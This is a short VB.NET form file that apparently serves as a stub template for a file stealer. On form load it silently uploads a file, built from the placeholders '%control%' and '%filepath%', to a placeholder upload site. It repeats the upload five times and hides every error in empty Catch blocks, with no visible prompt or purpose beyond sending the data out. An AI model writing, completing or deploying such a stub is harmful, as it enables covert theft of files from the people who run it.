Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim control As String = "%control%"
        Dim filepath As String = "%filepath%"
        Dim uploadsite As String = "%uploadsite%"
        Try
            My.Computer.Network.UploadFile(control & filepath, uploadsite)
        Catch ex As Exception
        End Try
        Try
            My.Computer.Network.UploadFile(control & filepath, uploadsite)
        Catch ex As Exception
        End Try
        Try
            My.Computer.Network.UploadFile(control & filepath, uploadsite)
        Catch ex As Exception
        End Try
        Try
            My.Computer.Network.UploadFile(control & filepath, uploadsite)
        Catch ex As Exception
        End Try
        Try
            My.Computer.Network.UploadFile(control & filepath, uploadsite)
        Catch ex As Exception
        End Try

    End Sub
End Class
